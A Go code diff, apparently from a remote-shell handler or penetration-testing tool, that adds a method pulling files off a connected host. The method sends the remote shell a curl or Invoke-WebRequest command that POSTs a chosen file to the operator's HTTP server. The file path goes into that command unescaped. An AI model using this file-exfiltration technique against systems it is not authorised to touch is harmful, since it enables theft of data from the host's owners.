@@ -689,6 +689,77 @@ func (t *Transferer) Download(ctx context.Context, remotePath, localPath string)
 	return nil
 }
 
+// SmartDownload downloads a file using HTTP POST (if binbag enabled) or b64 as fallback
+func (t *Transferer) SmartDownload(ctx context.Context, remotePath, localPath string) error {
+	if GlobalRuntimeConfig.BinbagEnabled && GlobalRuntimeConfig.FileServer != nil {
+		if err := t.downloadViaHTTP(ctx, remotePath, localPath); err == nil {
+			return nil
+		}
+		// HTTP failed, fallback
+		t.done(ui.Warning("HTTP download failed, falling back to base64..."))
+	}
+	return t.Download(ctx, remotePath, localPath)
+}
+
+// downloadViaHTTP tells the remote to POST the file to our HTTP server
+func (t *Transferer) downloadViaHTTP(ctx context.Context, remotePath, localPath string) error {
+	filename := filepath.Base(remotePath)
+	if localPath != "" {
+		filename = filepath.Base(localPath)
+	}
+
+	// Build URL for the remote to POST to
+	url := GlobalRuntimeConfig.GetHTTPURL(filename)
+
+	// Platform-specific POST command
+	var postCmd string
+	if t.platform == "windows" {
+		postCmd = fmt.Sprintf("Invoke-WebRequest -Uri '%s' -Method POST -InFile '%s'\r\n", url, remotePath)
+	} else {
+		postCmd = fmt.Sprintf("curl -s -X POST --data-binary @'%s' '%s'\n", remotePath, url)
+	}
+
+	// Get file size for progress (optional — remote file size unknown to us)
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Downloading %s via HTTP...", filename))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Downloading %s via HTTP...", filename))
+	}
+
+	// Send POST command to remote
+	if _, err := t.conn.Write([]byte(postCmd)); err != nil {
+		return fmt.Errorf("failed to send download command: %w", err)
+	}
+
+	// Wait for HTTP server to receive the file
+	if GlobalRuntimeConfig.FileServer != nil {
+		success := GlobalRuntimeConfig.FileServer.WaitForTransfer(filename, 30*time.Second, func(progress TransferProgress) {
+			if !progress.Done {
+				msg := fmt.Sprintf("Downloading %s via HTTP... %s",
+					filename, formatSize(int(progress.BytesTransferred)))
+				if spinner != nil {
+					spinner.Update(msg)
+				} else {
+					t.progress(msg)
+				}
+			}
+		})
+		if spinner != nil {
+			spinner.Stop()
+		}
+		if !success {
+			return fmt.Errorf("HTTP download timeout or failed")
+		}
+		t.done(ui.Success(fmt.Sprintf("Download complete! Saved to: %s", filename)))
+		return nil
+	}
+
+	return fmt.Errorf("file server not available")
+}
+
 // drainConnection drains any pending data from connection
 // This is CRITICAL before file transfer to remove leftover shell output
 func (t *Transferer) drainConnection() {
